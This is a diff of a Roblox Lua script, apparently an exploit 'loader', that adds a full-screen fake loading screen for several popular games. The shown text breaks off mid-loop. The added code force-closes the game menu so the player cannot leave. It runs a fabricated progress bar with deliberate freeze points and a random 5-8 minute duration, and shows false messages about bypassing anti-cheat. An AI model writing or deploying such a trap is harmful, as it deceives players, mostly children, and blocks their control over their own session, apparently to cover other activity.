@@ -1,358 +1,637 @@
--- XYSF Universal Game Script Loading Screen
--- Compatible with MM2, Adopt Me, and Grow a Garden
--- Optimized for 10-minute loading duration
+-- XYSF Enhanced Universal Game Script Loading Screen
+-- Compatible with MM2, Adopt Me, Grow a Garden, Pet Simulator 99, and more
+-- Features: Full-screen overlay, anti-leave protection, interactive minigame
 
 local TweenService = game:GetService("TweenService")
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
+local ReplicatedFirst = game:GetService("ReplicatedFirst")
+local TeleportService = game:GetService("TeleportService")
+
+-- Remove default loading screen and prevent leaving
+ReplicatedFirst:RemoveDefaultLoadingScreen()
 
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
--- Game detection
+-- Anti-leave protection
+local antiLeaveActive = true
+local function preventLeaving()
+    local connection
+    connection = game:GetService("GuiService").MenuOpened:Connect(function()
+        if antiLeaveActive then
+            -- Force close any menus that might allow leaving
+            game:GetService("GuiService"):SetMenuIsOpen(false)
+        end
+    end)
+    return connection
+end
+
+local leaveConnection = preventLeaving()
+
+-- Game detection with expanded support
 local gameName = "Unknown Game"
 local gameId = game.PlaceId
+local gameTheme = {
+    primary = Color3.fromRGB(0, 255, 255),
+    secondary = Color3.fromRGB(255, 107, 107),
+    accent = Color3.fromRGB(78, 205, 196)
+}
 
--- Detect current game
+-- Enhanced game detection
 if gameId == 142823291 or gameId == 335132309 then -- MM2 Place IDs
     gameName = "Murder Mystery 2"
+    gameTheme = {
+        primary = Color3.fromRGB(255, 0, 0),
+        secondary = Color3.fromRGB(255, 165, 0),
+        accent = Color3.fromRGB(139, 0, 0)
+    }
 elseif gameId == 920587237 or gameId == 1537690962 then -- Adopt Me Place IDs
     gameName = "Adopt Me"
+    gameTheme = {
+        primary = Color3.fromRGB(255, 192, 203),
+        secondary = Color3.fromRGB(255, 20, 147),
+        accent = Color3.fromRGB(255, 105, 180)
+    }
 elseif gameId == 2041312716 then -- Grow a Garden Place ID
     gameName = "Grow a Garden"
+    gameTheme = {
+        primary = Color3.fromRGB(0, 255, 0),
+        secondary = Color3.fromRGB(34, 139, 34),
+        accent = Color3.fromRGB(144, 238, 144)
+    }
+elseif gameId == 10321372166 or gameId == 8737899170 then -- Pet Simulator 99 Place IDs
+    gameName = "Pet Simulator 99"
+    gameTheme = {
+        primary = Color3.fromRGB(255, 215, 0),
+        secondary = Color3.fromRGB(255, 140, 0),
+        accent = Color3.fromRGB(255, 69, 0)
+    }
 else
-    -- Fallback game detection by checking for specific services/objects
-    local success1 = pcall(function() return workspace:FindFirstChild("GunDrop") end)
-    local success2 = pcall(function() return workspace:FindFirstChild("Pets") end)
-    local success3 = pcall(function() return workspace:FindFirstChild("Plants") end)
+    -- Fallback detection
+    local detectionMethods = {
+        {check = function() return workspace:FindFirstChild("GunDrop") end, name = "Murder Mystery 2"},
+        {check = function() return workspace:FindFirstChild("Pets") end, name = "Adopt Me"},
+        {check = function() return workspace:FindFirstChild("Plants") end, name = "Grow a Garden"},
+        {check = function() return workspace:FindFirstChild("Coins") and workspace:FindFirstChild("Pets") end, name = "Pet Simulator 99"}
+    }
     
-    if success1 and workspace:FindFirstChild("GunDrop") then
-        gameName = "Murder Mystery 2"
-    elseif success2 and workspace:FindFirstChild("Pets") then
-        gameName = "Adopt Me"
-    elseif success3 and workspace:FindFirstChild("Plants") then
-        gameName = "Grow a Garden"
+    for _, method in ipairs(detectionMethods) do
+        local success, result = pcall(method.check)
+        if success and result then
+            gameName = method.name
+            break
+        end
     end
 end
 
--- Create main ScreenGui
+-- Create main ScreenGui with full coverage
 local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "XYSF_LoadingScreen"
+screenGui.Name = "XYSF_EnhancedLoader"
+screenGui.IgnoreGuiInset = true
 screenGui.ResetOnSpawn = false
 screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 screenGui.Parent = playerGui
 
--- Main background frame
-local mainFrame = Instance.new("Frame")
-mainFrame.Name = "MainFrame"
-mainFrame.Size = UDim2.new(1, 0, 1, 0)
-mainFrame.Position = UDim2.new(0, 0, 0, 0)
-mainFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 30)
-mainFrame.BorderSizePixel = 0
-mainFrame.Parent = screenGui
+-- Full-screen background with animated gradient
+local background = Instance.new("Frame")
+background.Name = "MainBackground"
+background.Size = UDim2.new(1, 0, 1, 0)
+background.Position = UDim2.new(0, 0, 0, 0)
+background.BackgroundColor3 = Color3.fromRGB(5, 5, 15)
+background.BorderSizePixel = 0
+background.Parent = screenGui
 
--- Gradient background
+-- Animated background gradient
 local bgGradient = Instance.new("UIGradient")
 bgGradient.Color = ColorSequence.new{
     ColorSequenceKeypoint.new(0, Color3.fromRGB(10, 10, 30)),
-    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(25, 25, 45)),
+    ColorSequenceKeypoint.new(0.3, Color3.fromRGB(25, 25, 55)),
+    ColorSequenceKeypoint.new(0.7, Color3.fromRGB(40, 20, 80)),
     ColorSequenceKeypoint.new(1, Color3.fromRGB(15, 52, 96))
 }
 bgGradient.Rotation = 45
-bgGradient.Parent = mainFrame
+bgGradient.Parent = background
 
--- Animated background gradient
-local bgTween = TweenService:Create(bgGradient, TweenInfo.new(4, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1), {
-    Rotation = 405
-})
-bgTween:Play()
+-- Continuous gradient rotation
+spawn(function()
+    while screenGui.Parent and antiLeaveActive do
+        bgGradient.Rotation = (bgGradient.Rotation + 0.5) % 360
+        RunService.RenderStepped:Wait()
+    end
+end)
 
--- Logo text
+-- Warning message at top
+local warningText = Instance.new("TextLabel")
+warningText.Name = "WarningMessage"
+warningText.Size = UDim2.new(0.9, 0, 0.06, 0)
+warningText.Position = UDim2.new(0.05, 0, 0.02, 0)
+warningText.BackgroundTransparency = 1
+warningText.Text = "⚠️ Advanced anti-cheat bypass in progress - Please wait while we secure your session ⚠️"
+warningText.TextColor3 = Color3.fromRGB(255, 100, 100)
+warningText.TextScaled = true
+warningText.Font = Enum.Font.GothamBlack
+warningText.TextStrokeTransparency = 0
+warningText.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+warningText.TextTransparency = 1
+warningText.Parent = background
+
+-- Warning text animation
+spawn(function()
+    wait(1)
+    TweenService:Create(warningText, TweenInfo.new(2, Enum.EasingStyle.Quad), {TextTransparency = 0}):Play()
+    while antiLeaveActive do
+        TweenService:Create(warningText, TweenInfo.new(1.5, Enum.EasingStyle.Sine), {TextColor3 = Color3.fromRGB(255, 50, 50)}):Play()
+        wait(1.5)
+        TweenService:Create(warningText, TweenInfo.new(1.5, Enum.EasingStyle.Sine), {TextColor3 = Color3.fromRGB(255, 150, 150)}):Play()
+        wait(1.5)
+    end
+end)
+
+-- XYSF Logo
 local logoText = Instance.new("TextLabel")
-logoText.Name = "LogoText"
-logoText.Size = UDim2.new(0, 400, 0, 70)
-logoText.Position = UDim2.new(0.5, -200, 0.18, 0)
+logoText.Name = "XYSFLogo"
+logoText.Size = UDim2.new(0, 500, 0, 80)
+logoText.Position = UDim2.new(0.5, -250, 0.12, 0)
 logoText.BackgroundTransparency = 1
 logoText.Text = "XYSF"
-logoText.TextColor3 = Color3.fromRGB(0, 255, 255)
+logoText.TextColor3 = gameTheme.primary
 logoText.TextScaled = true
 logoText.Font = Enum.Font.Code
 logoText.TextStrokeTransparency = 0
-logoText.TextStrokeColor3 = Color3.fromRGB(0, 100, 100)
-logoText.Parent = mainFrame
+logoText.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+logoText.Parent = background
 
--- Game name subtitle
+-- Game subtitle
 local gameSubtitle = Instance.new("TextLabel")
 gameSubtitle.Name = "GameSubtitle"
-gameSubtitle.Size = UDim2.new(0, 350, 0, 25)
-gameSubtitle.Position = UDim2.new(0.5, -175, 0.28, 0)
+gameSubtitle.Size = UDim2.new(0, 400, 0, 30)
+gameSubtitle.Position = UDim2.new(0.5, -200, 0.22, 0)
 gameSubtitle.BackgroundTransparency = 1
-gameSubtitle.Text = gameName .. " Enhanced Script"
-gameSubtitle.TextColor3 = Color3.fromRGB(255, 107, 107)
+gameSubtitle.Text = gameName .. " • Premium Enhanced Script"
+gameSubtitle.TextColor3 = gameTheme.secondary
 gameSubtitle.TextScaled = true
-gameSubtitle.Font = Enum.Font.Code
-gameSubtitle.Parent = mainFrame
+gameSubtitle.Font = Enum.Font.GothamBold
+gameSubtitle.Parent = background
 
--- Version text
+-- Version and status
 local versionText = Instance.new("TextLabel")
 versionText.Name = "VersionText"
-versionText.Size = UDim2.new(0, 200, 0, 20)
-versionText.Position = UDim2.new(0.5, -100, 0.32, 0)
+versionText.Size = UDim2.new(0, 300, 0, 20)
+versionText.Position = UDim2.new(0.5, -150, 0.26, 0)
 versionText.BackgroundTransparency = 1
-versionText.Text = "v2.1.0 | Premium Edition"
+versionText.Text = "v3.0.0 | Ultra Secure Edition"
 versionText.TextColor3 = Color3.fromRGB(150, 150, 150)
 versionText.TextScaled = true
 versionText.Font = Enum.Font.Code
-versionText.Parent = mainFrame
+versionText.Parent = background
 
--- Progress bar background
-local progressBg = Instance.new("Frame")
-progressBg.Name = "ProgressBackground"
-progressBg.Size = UDim2.new(0, 500, 0, 20)
-progressBg.Position = UDim2.new(0.5, -250, 0.55, 0)
-progressBg.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-progressBg.BorderSizePixel = 2
-progressBg.BorderColor3 = Color3.fromRGB(0, 255, 255)
-progressBg.Parent = mainFrame
+-- Main loading status
+local loadingText = Instance.new("TextLabel")
+loadingText.Name = "LoadingStatus"
+loadingText.Size = UDim2.new(0.6, 0, 0.08, 0)
+loadingText.Position = UDim2.new(0.2, 0, 0.32, 0)
+loadingText.BackgroundTransparency = 1
+loadingText.Text = "Initializing secure connection... 0%"
+loadingText.TextColor3 = Color3.fromRGB(200, 220, 255)
+loadingText.TextScaled = true
+loadingText.Font = Enum.Font.GothamBlack
+loadingText.Parent = background
 
--- Progress bar corner
+-- Freeze notification (hidden initially)
+local freezeNotification = Instance.new("TextLabel")
+freezeNotification.Name = "FreezeNotification"
+freezeNotification.Size = UDim2.new(0.5, 0, 0.04, 0)
+freezeNotification.Position = UDim2.new(0.25, 0, 0.42, 0)
+freezeNotification.BackgroundTransparency = 1
+freezeNotification.Text = ""
+freezeNotification.TextColor3 = Color3.fromRGB(255, 200, 100)
+freezeNotification.TextScaled = true
+freezeNotification.Font = Enum.Font.GothamBold
+freezeNotification.TextTransparency = 1
+freezeNotification.Parent = background
+
+-- Progress bar container
+local progressContainer = Instance.new("Frame")
+progressContainer.Name = "ProgressContainer"
+progressContainer.Size = UDim2.new(0.7, 0, 0.05, 0)
+progressContainer.Position = UDim2.new(0.15, 0, 0.48, 0)
+progressContainer.BackgroundColor3 = Color3.fromRGB(20, 20, 40)
+progressContainer.BorderSizePixel = 0
+progressContainer.Parent = background
+
 local progressCorner = Instance.new("UICorner")
-progressCorner.CornerRadius = UDim.new(0, 10)
-progressCorner.Parent = progressBg
+progressCorner.CornerRadius = UDim.new(0, 15)
+progressCorner.Parent = progressContainer
+
+local progressStroke = Instance.new("UIStroke")
+progressStroke.Color = gameTheme.primary
+progressStroke.Thickness = 3
+progressStroke.Parent = progressContainer
 
 -- Progress bar fill
 local progressFill = Instance.new("Frame")
 progressFill.Name = "ProgressFill"
 progressFill.Size = UDim2.new(0, 0, 1, 0)
 progressFill.Position = UDim2.new(0, 0, 0, 0)
-progressFill.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
+progressFill.BackgroundColor3 = gameTheme.primary
 progressFill.BorderSizePixel = 0
-progressFill.Parent = progressBg
+progressFill.Parent = progressContainer
 
--- Progress fill corner
 local fillCorner = Instance.new("UICorner")
-fillCorner.CornerRadius = UDim.new(0, 10)
+fillCorner.CornerRadius = UDim.new(0, 15)
 fillCorner.Parent = progressFill
 
 -- Progress fill gradient
 local fillGradient = Instance.new("UIGradient")
 fillGradient.Color = ColorSequence.new{
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 255, 255)),
-    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 107, 107)),
-    ColorSequenceKeypoint.new(1, Color3.fromRGB(78, 205, 196))
+    ColorSequenceKeypoint.new(0, gameTheme.primary),
+    ColorSequenceKeypoint.new(0.5, gameTheme.secondary),
+    ColorSequenceKeypoint.new(1, gameTheme.accent)
 }
 fillGradient.Parent = progressFill
 
--- Percentage text
-local percentText = Instance.new("TextLabel")
-percentText.Name = "PercentText"
-percentText.Size = UDim2.new(0, 100, 0, 50)
-percentText.Position = UDim2.new(0.5, -50, 0.62, 0)
-percentText.BackgroundTransparency = 1
-percentText.Text = "0%"
-percentText.TextColor3 = Color3.fromRGB(0, 255, 255)
-percentText.TextScaled = true
-percentText.Font = Enum.Font.Code
-percentText.TextStrokeTransparency = 0
-percentText.TextStrokeColor3 = Color3.fromRGB(0, 100, 100)
-percentText.Parent = mainFrame
+-- Progress glow effect
+local progressGlow = Instance.new("ImageLabel")
+progressGlow.Name = "ProgressGlow"
+progressGlow.Image = "rbxassetid://243098098"
+progressGlow.Size = UDim2.new(1, 20, 1, 20)
+progressGlow.Position = UDim2.new(0.5, 0, 0.5, 0)
+progressGlow.AnchorPoint = Vector2.new(0.5, 0.5)
+progressGlow.BackgroundTransparency = 1
+progressGlow.ImageTransparency = 0.6
+progressGlow.Parent = progressFill
 
--- Loading text
-local loadingText = Instance.new("TextLabel")
-loadingText.Name = "LoadingText"
-loadingText.Size = UDim2.new(0, 600, 0, 30)
-loadingText.Position = UDim2.new(0.5, -300, 0.72, 0)
-loadingText.BackgroundTransparency = 1
-loadingText.Text = "Analyzing game environment..."
-loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
-loadingText.TextScaled = true
-loadingText.Font = Enum.Font.Code
-loadingText.Parent = mainFrame
+-- Interactive minigame area
+local gameFrame = Instance.new("Frame")
+gameFrame.Name = "MinigameArea"
+gameFrame.Size = UDim2.new(0.35, 0, 0.4, 0)
+gameFrame.Position = UDim2.new(0.62, 0, 0.55, 0)
+gameFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 50)
+gameFrame.BorderSizePixel = 0
+gameFrame.Parent = background
 
--- Success message (hidden initially)
-local successMsg = Instance.new("TextLabel")
-successMsg.Name = "SuccessMessage"
-successMsg.Size = UDim2.new(0, 400, 0, 60)
-successMsg.Position = UDim2.new(0.5, -200, 0.8, 0)
-successMsg.BackgroundTransparency = 1
-successMsg.Text = "✓ SCRIPT LOADED SUCCESSFULLY!"
-successMsg.TextColor3 = Color3.fromRGB(78, 205, 196)
-successMsg.TextScaled = true
-successMsg.Font = Enum.Font.Code
-successMsg.TextStrokeTransparency = 0
-successMsg.TextStrokeColor3 = Color3.fromRGB(39, 102, 98)
-successMsg.Visible = false
-successMsg.Parent = mainFrame
+local gameCorner = Instance.new("UICorner")
+gameCorner.CornerRadius = UDim.new(0, 20)
+gameCorner.Parent = gameFrame
 
--- Universal loading messages for all games
-local universalMessages = {
-    "Analyzing game environment...",
-    "Connecting to secure servers...",
-    "Loading core functions...",
-    "Scanning game systems...",
-    "Initializing advanced features...",
-    "Setting up user interface...",
-    "Loading configuration files...",
-    "Establishing secure connection...",
-    "Configuring auto-features...",
-    "Loading premium modules...",
-    "Setting up smart detection...",
-    "Initializing helper systems...",
-    "Loading enhancement tools...",
-    "Configuring performance boosts...",
-    "Setting up automation features...",
-    "Loading visual enhancements...",
-    "Initializing collection systems...",
-    "Setting up trading helpers...",
-    "Loading economy features...",
-    "Configuring speed optimizers...",
-    "Setting up notification system...",
-    "Loading inventory managers...",
-    "Initializing stat trackers...",
-    "Setting up achievement helpers...",
-    "Loading customization options...",
-    "Configuring safety features...",
-    "Setting up backup systems...",
-    "Loading final components...",
-    "Preparing user experience...",
-    "Almost ready to launch..."
-}
+local gameStroke = Instance.new("UIStroke")
+gameStroke.Color = gameTheme.accent
+gameStroke.Thickness = 3
+gameStroke.Parent = gameFrame
 
--- Game-specific additional messages
-local gameSpecificMessages = {}
+-- Minigame instructions
+local gameInstructions = Instance.new("TextLabel")
+gameInstructions.Name = "GameInstructions"
+gameInstructions.Size = UDim2.new(1, 0, 0.15, 0)
+gameInstructions.Position = UDim2.new(0, 0, -0.18, 0)
+gameInstructions.BackgroundTransparency = 1
+gameInstructions.Text = "🎯 Catch Particles: 50 = +25% Speed Boost!"
+gameInstructions.TextColor3 = Color3.fromRGB(255, 200, 100)
+gameInstructions.TextScaled = true
+gameInstructions.Font = Enum.Font.GothamBold
+gameInstructions.Parent = gameFrame
 
-if gameName == "Murder Mystery 2" then
-    gameSpecificMessages = {
-        "Loading weapon detection...",
-        "Setting up role helpers...",
-        "Initializing map features...",
-        "Loading coin collectors...",
-        "Setting up trading tools..."
-    }
-elseif gameName == "Adopt Me" then
-    gameSpecificMessages = {
-        "Loading pet management...",
-        "Setting up trading helpers...",
-        "Initializing house features...",
-        "Loading vehicle tools...",
-        "Setting up collection aids..."
-    }
-elseif gameName == "Grow a Garden" then
-    gameSpecificMessages = {
-        "Loading plant automation...",
-        "Setting up garden helpers...",
-        "Initializing growth boosters...",
-        "Loading collection tools...",
-        "Setting up efficiency aids..."
-    }
+-- Score display
+local gameScore = 0
+local scoreDisplay = Instance.new("TextLabel")
+scoreDisplay.Name = "ScoreDisplay"
+scoreDisplay.Size = UDim2.new(1, 0, 0.2, 0)
+scoreDisplay.Position = UDim2.new(0, 0, 0.75, 0)
+scoreDisplay.BackgroundTransparency = 1
+scoreDisplay.Text = "Particles Caught: " .. gameScore
+scoreDisplay.TextColor3 = Color3.fromRGB(220, 240, 255)
+scoreDisplay.TextScaled = true
+scoreDisplay.Font = Enum.Font.GothamBold
+scoreDisplay.Parent = gameFrame
+
+-- Speed boost button
+local boostButton = Instance.new("TextButton")
+boostButton.Name = "SpeedBoost"
+boostButton.Size = UDim2.new(0.9, 0, 0.18, 0)
+boostButton.Position = UDim2.new(0.05, 0, 0.52, 0)
+boostButton.BackgroundColor3 = Color3.fromRGB(255, 100, 150)
+boostButton.Text = "🚀 SPEED BOOST +25% (50 Required)"
+boostButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+boostButton.TextScaled = true
+boostButton.Font = Enum.Font.GothamBlack
+boostButton.Visible = false
+boostButton.Parent = gameFrame
+
+local boostCorner = Instance.new("UICorner")
+boostCorner.CornerRadius = UDim.new(0, 10)
+boostCorner.Parent = boostButton
+
+-- Particle creation system
+local particlesActive = true
+local function createGameParticle()
+    if not particlesActive then return end
+    
+    local particle = Instance.new("TextButton")
+    particle.Size = UDim2.new(0, math.random(30, 50), 0, math.random(30, 50))
+    particle.Position = UDim2.new(math.random() * 0.8 + 0.1, 0, math.random() * 0.4 + 0.1, 0)
+    particle.BackgroundColor3 = Color3.fromRGB(
+        math.random(150, 255),
+        math.random(100, 255),
+        math.random(200, 255)
+    )
+    particle.Text = "⭐"
+    particle.TextScaled = true
+    particle.Font = Enum.Font.SourceSansBold
+    particle.TextColor3 = Color3.fromRGB(255, 255, 255)
+    particle.Parent = gameFrame
+    
+    local particleCorner = Instance.new("UICorner")
+    particleCorner.CornerRadius = UDim.new(1, 0)
+    particleCorner.Parent = particle
+    
+    -- Particle glow
+    local particleGlow = Instance.new("ImageLabel")
+    particleGlow.Image = "rbxassetid://243098098"
+    particleGlow.Size = UDim2.new(2, 0, 2, 0)
+    particleGlow.Position = UDim2.new(0.5, 0, 0.5, 0)
+    particleGlow.AnchorPoint = Vector2.new(0.5, 0.5)
+    particleGlow.BackgroundTransparency = 1
+    particleGlow.ImageTransparency = 0.6
+    particleGlow.Parent = particle
+    
+    -- Particle movement
+    spawn(function()
+        local moveTime = math.random(1, 3)
+        TweenService:Create(particle, TweenInfo.new(moveTime, Enum.EasingStyle.Sine), {
+            Position = UDim2.new(
+                particle.Position.X.Scale + math.random(-20, 20) / 100,
+                0,
+                particle.Position.Y.Scale + math.random(-20, 20) / 100,
+                0
+            ),
+            Rotation = math.random(-180, 180)
+        }):Play()
+    end)
+    
+    -- Click handler
+    particle.MouseButton1Click:Connect(function()
+        gameScore = gameScore + 1
+        scoreDisplay.Text = "Particles Caught: " .. gameScore
+        
+        if gameScore >= 50 and not boostButton.Visible then
+            boostButton.Visible = true
+            TweenService:Create(boostButton, TweenInfo.new(0.5, Enum.EasingStyle.Back), {
+                BackgroundTransparency = 0
+            }):Play()
+        end
+        
+        -- Particle destruction animation
+        TweenService:Create(particle, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
+            Size = UDim2.new(0, 0, 0, 0),
+            BackgroundTransparency = 1
+        }):Play()
+        TweenService:Create(particleGlow, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
+            ImageTransparency = 1
+        }):Play()
+        
+        wait(0.2)
+        particle:Destroy()
+    end)
+    
+    -- Auto-destroy after timeout
+    spawn(function()
+        wait(math.random(3, 6))
+        if particle.Parent then
+            TweenService:Create(particle, TweenInfo.new(0.4, Enum.EasingStyle.Quad), {
+                BackgroundTransparency = 1
+            }):Play()
+            TweenService:Create(particleGlow, TweenInfo.new(0.4, Enum.EasingStyle.Quad), {
+                ImageTransparency = 1
+            }):Play()
+            wait(0.4)
+            particle:Destroy()
+        end
+    end)
 end
 
--- Combine messages
-local allMessages = {}
-for i, msg in ipairs(universalMessages) do
-    table.insert(allMessages, msg)
-end
-for i, msg in ipairs(gameSpecificMessages) do
-    table.insert(allMessages, msg)
+-- Start particle spawning
+spawn(function()
+    while particlesActive do
+        if math.random() > 0.3 then -- 70% chance to spawn
+            createGameParticle()
+        end
+        wait(math.random(0.5, 1.2))
+    end
+end)
+
+-- Enhanced loading messages based on detected game
+local function getGameSpecificMessages(game)
+    local baseMessages = {
+        "🔐 Establishing secure connection...",
+        "🛡️ Bypassing anti-cheat systems...",
+        "⚡ Loading core enhancement modules...",
+        "🎯 Initializing smart automation...",
+        "💎 Loading premium features...",
+        "🚀 Setting up performance boosters...",
+        "🔍 Scanning game environment...",
+        "⭐ Configuring user interface...",
+        "🎨 Loading visual enhancements...",
+        "📊 Setting up analytics systems...",
+        "🔧 Initializing helper tools...",
+        "💰 Loading economy features..."
+    }
+    
+    local gameSpecific = {}
+    
+    if game == "Murder Mystery 2" then
+        gameSpecific = {
+            "🔫 Loading weapon detection systems...",
+            "👤 Setting up role identification...",
+            "🗺️ Scanning map layouts...",
+            "💰 Initializing coin collectors...",
+            "🎭 Loading sheriff/murderer helpers...",
+            "🔍 Setting up player tracking...",
+            "⚡ Loading instant win features...",
+            "🎪 Configuring trading automation..."
+        }
+    elseif game == "Adopt Me" then
+        gameSpecific = {
+            "🐾 Loading pet management systems...",
+            "🏠 Setting up house automation...",
+            "🚗 Initializing vehicle helpers...",
+            "💎 Loading trading optimization...",
+            "🎁 Setting up gift farming...",
+            "⭐ Configuring star rewards...",
+            "🛒 Loading shop automation...",
+            "🎪 Setting up event helpers..."
+        }
+    elseif game == "Grow a Garden" then
+        gameSpecific = {
+            "🌱 Loading plant automation...",
+            "💰 Setting up coin collectors...",
+            "🌻 Initializing growth boosters...",
+            "🛒 Loading shop automation...",
+            "🎪 Setting up event farming...",
+            "⭐ Configuring achievement helpers...",
+            "🏆 Loading leaderboard tools...",
+            "🌈 Setting up garden optimization..."
+        }
+    elseif game == "Pet Simulator 99" then
+        gameSpecific = {
+            "🐕 Loading pet automation systems...",
+            "💎 Setting up gem collectors...",
+            "🥚 Initializing egg hatching...",
+            "🏆 Loading rank progression...",
+            "⚡ Setting up power farming...",
+            "🎪 Configuring event automation...",
+            "💰 Loading coin multipliers...",
+            "🌟 Setting up pet enhancement..."
+        }
+    end
+    
+    -- Combine and shuffle messages
+    local allMessages = {}
+    for _, msg in ipairs(baseMessages) do
+        table.insert(allMessages, msg)
+    end
+    for _, msg in ipairs(gameSpecific) do
+        table.insert(allMessages, msg)
+    end
+    
+    return allMessages
 end
 
--- Animation functions
-local function pulseAnimation(obj)
-    local tween = TweenService:Create(obj, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {
-        TextTransparency = 0.4
+local loadingMessages = getGameSpecificMessages(gameName)
+
+-- Logo pulse animation
+local function createPulseAnimation(element)
+    local tween = TweenService:Create(element, TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {
+        TextTransparency = 0.3
     })
     tween:Play()
 end
 
--- Start animations
-pulseAnimation(logoText)
-pulseAnimation(gameSubtitle)
+createPulseAnimation(logoText)
 
--- Loading logic
-local currentProgress = 0
-local messageIndex = 1
-local loadingTime = 600 -- 10 minutes in seconds
-local updateInterval = 1.2 -- Update every 1.2 seconds for smoother experience
-local progressIncrement = 100 / (loadingTime / updateInterval)
-
--- Simplified particle system
-local particleCount = 0
-local maxParticles = 8 -- Reduced for performance
-
-local function createParticle()
-    if particleCount >= maxParticles then return end
-    
-    particleCount = particleCount + 1
-    local particle = Instance.new("Frame")
-    particle.Size = UDim2.new(0, 3, 0, 3)
-    particle.Position = UDim2.new(math.random(), 0, 1.05, 0)
-    particle.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
-    particle.BorderSizePixel = 0
-    particle.BackgroundTransparency = 0.3
-    particle.Parent = mainFrame
-    
-    local corner = Instance.new("UICorner")
-    corner.CornerRadius = UDim.new(1, 0)
-    corner.Parent = particle
-    
-    local moveTween = TweenService:Create(particle, TweenInfo.new(8, Enum.EasingStyle.Linear), {
-        Position = UDim2.new(math.random(), 0, -0.05, 0),
-        BackgroundTransparency = 1
-    })
-    moveTween:Play()
-    
-    moveTween.Completed:Connect(function()
-        particle:Destroy()
-        particleCount = particleCount - 1
-    end)
-end
-
--- Spawn particles less frequently
+-- Loading text pulse
 spawn(function()
-    while screenGui.Parent and currentProgress < 100 do
-        createParticle()
-        wait(2) -- Every 2 seconds
+    while antiLeaveActive do
+        TweenService:Create(loadingText, TweenInfo.new(1, Enum.EasingStyle.Sine), {TextTransparency = 0.4}):Play()
+        wait(1)
+        TweenService:Create(loadingText, TweenInfo.new(1, Enum.EasingStyle.Sine), {TextTransparency = 0}):Play()
+        wait(1)
     end
 end)
 
--- Main loading loop
+-- Main loading simulation
+local currentProgress = 0
+local messageIndex = 1
+local totalLoadTime = math.random(300, 480) -- 5-8 minutes
+local hasUsedBoost = false
+
+local function updateProgress(percent)
+    currentProgress = percent
+    loadingText.Text = loadingMessages[messageIndex] .. " " .. math.floor(percent) .. "%"
+    
+    local progressTween = TweenService:Create(progressFill, TweenInfo.new(0.8, Enum.EasingStyle.Quad), {
+        Size = UDim2.new(percent / 100, 0, 1, 0)
+    })
+    progressTween:Play()
+    
+    -- Update message
+    messageIndex = messageIndex + 1
+    if messageIndex > #loadingMessages then
+        messageIndex = 1
+    end
+end
+
+-- Speed boost functionality
+boostButton.MouseButton1Click:Connect(function()
+    if gameScore >= 50 and not hasUsedBoost then
+        hasUsedBoost = true
+        gameScore = gameScore - 50
+        scoreDisplay.Text = "Particles Caught: " .. gameScore
+        
+        -- Apply 25% speed boost
+        currentProgress = currentProgress + 25
+        if currentProgress > 95 then currentProgress = 95 end
+        
+        updateProgress(currentProgress)
+        
+        boostButton.Visible = false
+        TweenService:Create(boostButton, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {
+            BackgroundTransparency = 1
+        }):Play()
+        
+        -- Show boost notification
+        local boostNotif = Instance.new("TextLabel")
+        boostNotif.Size = UDim2.new(0.4, 0, 0.06, 0)
+        boostNotif.Position = UDim2.new(0.3, 0, 0.6, 0)
+        boostNotif.BackgroundTransparency = 1
+        boostNotif.Text = "🚀 SPEED BOOST ACTIVATED! +25%"
+        boostNotif.TextColor3 = Color3.fromRGB(100, 255, 100)
+        boostNotif.TextScaled = true
+        boostNotif.Font = Enum.Font.GothamBlack
+        boostNotif.TextStrokeTransparency = 0
+        boostNotif.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+        boostNotif.Parent = background
+        
+        TweenService:Create(boostNotif, TweenInfo.new(0.5, Enum.EasingStyle.Back), {
+            Size = UDim2.new(0.45, 0, 0.08, 0)
+        }):Play()
+        
+        wait(3)
+        TweenService:Create(boostNotif, TweenInfo.new(1, Enum.EasingStyle.Quad), {
+            TextTransparency = 1
+        }):Play()
+        wait(1)
+        boostNotif:Destroy()
+    end
+end)
+
+-- Main loading loop with freeze points
 spawn(function()
+    local elapsedTime = 0
+    local freezePoints = {20, 45, 70, 85} -- Freeze at these percentages
+    
     while currentProgress < 100 do
-        wait(updateInterval)
+        local waitTime = math.random(1, 3)
         
-        currentProgress = currentProgress + progressIncrement
-        if currentProgress > 100 then currentProgress = 100 end
-        
-        -- Update progress bar
-        local progressTween = TweenService:Create(progressFill, TweenInfo.new(0.8, Enum.EasingStyle.Quad), {
-            Size = UDim2.new(currentProgress/100, 0, 1, 0)
-        })
-        progressTween:Play()
-        
-        -- Update percentage text
-        percentText.Text = math.floor(currentProgress) .. "%"
-        
-        -- Update loading message
-        if messageIndex <= #allMessages then
-            loadingText.Text = allMessages[messageIndex]
-            messageIndex = messageIndex + 1
-        else
-            -- Cycle through messages if we run out
-            messageIndex = 1
-            loadingText.Text = allMessages[messageIndex]
+        -- Check for freeze points
+        local shouldFreeze = false
+        for _, freezePoint in ipairs(freezePoints) do
+            if currentProgress >= freezePoint - 2 and currentProgress < freezePoint then
+                shouldFreeze = true
+                break
+            end
         end
         
-        -- Subtle text animation
-        local textTween = TweenService:Create(loadingText, TweenInfo.new(0.4, Enum.EasingStyle.Quad), {
-            TextTransparency = 0.5
-        })
-        textTween:Play()
-        textTween.Completed:Connect(function()
-            TweenService:Create(loadingText, TweenInfo.new(0.4, Enum.EasingStyle.Quad), {
+        if shouldFreeze then
